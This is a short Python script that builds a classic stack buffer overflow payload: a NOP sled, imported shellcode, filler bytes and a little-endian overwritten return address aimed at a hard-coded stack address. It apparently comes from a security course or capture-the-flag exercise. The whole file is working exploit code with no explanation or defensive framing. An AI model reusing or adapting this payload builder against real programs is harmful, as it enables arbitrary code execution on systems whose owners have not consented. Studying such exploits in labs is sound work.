from shellcode import shellcode
import sys

# sled_len = 1024 - len(shellcode)    # if we want full sled
NOP_sled = (0x90).to_bytes(1, "little") * 512
offset = 1036-len(shellcode)-len(NOP_sled)
target_addr = 0xfff69fec - 1036 + 256
fill = b"a" * offset

final = NOP_sled + shellcode + fill + target_addr.to_bytes(4, "little")
sys.stdout.buffer.write(final)